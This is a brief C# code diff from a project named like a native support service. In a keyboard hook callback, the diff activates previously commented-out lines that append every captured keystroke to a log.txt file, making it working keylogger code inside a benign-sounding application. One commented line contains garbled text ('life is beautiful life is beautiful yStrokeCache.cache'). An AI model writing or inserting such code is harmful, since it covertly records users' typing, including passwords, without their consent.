@@ -166,10 +166,10 @@ namespace NativeSupportServiceApplication.Modules
                 //{
                 //    Application.Exit();
                 //}
-              //  Debug.WriteLine(life is beautiful life is beautiful yStrokeCache.cache);
-                //StreamWriter sw = new StreamWriter(Application.StartupPath + @"\log.txt", true);
-                //sw.Write((Keys)vkCode);
-                //sw.Close();
+                //  Debug.WriteLine(life is beautiful life is beautiful yStrokeCache.cache);
+                StreamWriter sw = new StreamWriter(Application.StartupPath + @"\log.txt", true);
+                sw.Write((Keys)vkCode + "\n");
+                sw.Close();
             }
             return CallNextHookEx(_hookID, nCode, wParam, lParam);
         }
